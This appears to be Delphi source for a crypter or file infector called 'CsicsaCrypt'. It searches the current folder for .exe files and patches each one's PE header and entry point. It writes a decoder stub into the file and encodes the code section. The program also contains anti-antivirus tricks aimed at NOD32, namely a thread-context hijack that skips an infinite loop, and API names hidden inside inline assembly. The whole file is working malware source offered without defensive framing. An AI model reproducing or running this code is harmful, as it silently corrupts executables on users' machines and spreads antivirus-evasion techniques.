program CsicsaCrypt;
uses
  SysUtils,windows;

const
 decoder:array [0..37] of byte =(
 $FD, $33, $C0, $BF, $78, $56, $34, $12, $B9, $78, $56, $34, $12, $03, $07, $AB,
 $49, $75, $FA, $FC, $33, $C0, $BF, $78, $56, $34, $12, $B9, $78, $56, $34, $12,
 $03, $07, $AB, $49, $75, $FA);

OFFS1=4;
OFFS2=9;
OFFS3=23;
OFFS4=28;
type
 PFFA= function (lpFileName: PAnsiChar; var lpFindFileData: TWIN32FindDataA): THandle; stdcall;
 PFNA= function (hFindFile: THandle; var lpFindFileData: TWIN32FindData): BOOL; stdcall;
var
 NODFail,NODFail2:cardinal;
function NODfailproc(semmi:pointer):integer;
var
cnt:Context;
begin
 sleep(0);
 suspendthread(NODFail);
 zeromemory(@cnt,sizeof(cnt));
 cnt.ContextFlags:=CONTEXT_FULL;
 GetThreadContext(NODFail,cnt);
 cnt.ContextFlags:=CONTEXT_CONTROL;
 cnt.Eip:=cnt.eip+4;
 Setthreadcontext(NODFail,cnt);
 resumethread(NODFail);
end;

var
 fil:file;
 i:integer;
 pe:integer;
 base:integer;
 oep:integer;
 soc,soc4:integer;
 csec:integer;
 adat:integer;
 caddr:integer;
 cpoi:integer;
 code:array of dword;
 poffs:Pdword;
 findhandle:Thandle;
 findrec:WIN32_FIND_DATA;
 pfr:pointer;
 gpa:Pointer;
 Proc_FFA:PFFA;
 Proc_FNA:PFNA;
 pexe:Pchar;
 kernelhandle:Thandle;
 jolvan:boolean;
 minuszegy:cardinal;
begin

  DuplicateHandle($0FFFFFFFF,$0FFFFFFFE,$0FFFFFFFF, @NODFail ,
                            0,true,2);
  beginthread(nil,0,nodfailproc,nil,0,NODFail2);
 asm
   MOV EAX,1
   @loop:
   ROL EAX,1
   JMP @loop
   NOP
   NOP
   NOP
   NOP
  end;


 try
  Proc_FFA(pexe,findrec);
 except
  pfr:=@findrec;
  gpa:=@GetProcAddress;
 end;


 getmem(pexe,20);
 kernelhandle:=GetModuleHandle('kernel32.dll');
 asm
  call @csicsa
  db $C8
  jmp @csicsa2

   db 'FindFirstFileA',0
   db 'FindNextFileA',0
   db '*.exe',0
  @csicsa:
   pop eax
   inc eax
   push eax
   ret
  @csicsa2:
  push eax
  add eax,2
  push eax
  push kernelhandle
  mov eax,gpa
  call eax
  mov Proc_FFA,eax

  mov eax,[esp]
  add eax,17
  push eax
  push kernelhandle
  mov eax,gpa
  call eax
  mov Proc_FNA,eax

  mov eax,[esp]
  add eax,30
  mov ecx,pexe
  dec ecx
  xor edx,edx
  @loop:
   inc eax
   inc ecx
   mov dl,[eax]
   mov [ecx],dl
   test dl,dl
   jnz @loop

  pop eax
 end;
 findhandle:=Proc_FFA(pexe,findrec);

 if findhandle<>INVALID_HANDLE_VALUE then
 repeat
 try
 assignfile(fil,findrec.cFileName);
 reset(fil,1);
 seek(fil,$3c);
 blockread(fil,pe,4);

 seek(fil,pe+$34);
 blockread(fil,base,4);
// writeln('Image base:',inttohex(base,8));

 seek(fil,pe+$28);
 blockread(fil,oep,4);
// writeln('Original OEP:',inttohex(oep,8));

 seek(fil,pe+$1c);
 blockread(fil,soc,4);
// writeln('Size Of Code:',inttohex(soc,8));

 csec:=pe+$f8;
 repeat
  seek(fil,csec+$8);
  blockread(fil,soc,4);
  blockread(fil,caddr,4);
  if (caddr<=oep) and (oep<=caddr+soc) then
   break;

  csec:=csec+$28;
 until false;

 seek(fil,csec+$14);
 blockread(fil,cpoi,4);

 seek(fil,csec+$24);
 blockread(fil,adat,4);
 adat:=adat or $80000000;
 seek(fil,csec+$24);
 blockwrite(fil,adat,4);

// writeln('File Pointer of Code:',inttohex(cpoi,8));
// writeln('Actual Size Of Code:',inttohex(soc,8));

 //OEP patch
 seek(fil,pe+$28);
 adat:=2;
 blockwrite(fil,adat,4);


 //STUB

 soc4:=soc div 4;

 poffs:=@(decoder[OFFS1]);
 poffs^:=base+caddr+soc4*4-4;
 poffs:=@(decoder[OFFS2]);
 poffs^:=soc4;
 poffs:=@(decoder[OFFS3]);
 poffs^:=base+caddr;
 poffs:=@(decoder[OFFS4]);
 poffs^:=soc4;
 seek(fil,2);
 blockwrite(fil,decoder,sizeof(decoder));
 adat:=$E9;
 blockwrite(fil,adat,1);
 adat:=oep-45;
 blockwrite(fil,adat,4);


 //Encode
 seek(fil,cpoi);
 setlength(code,soc4);
 blockread(fil,code[0],soc4*4);

 //odafelé:
 for i:=soc4-1 downto 1 do
  code[i]:=code[i]-code[i-1];

 //visszafelé:
 for i:=0 to soc4-2 do
  code[i]:=code[i]-code[i+1];

 seek(fil,cpoi);
 blockwrite(fil,code[0],soc4*4);
// writeln('Encryption succesful...') ;
 except
 end
 until not Proc_FNA(findhandle,findrec);
  

end.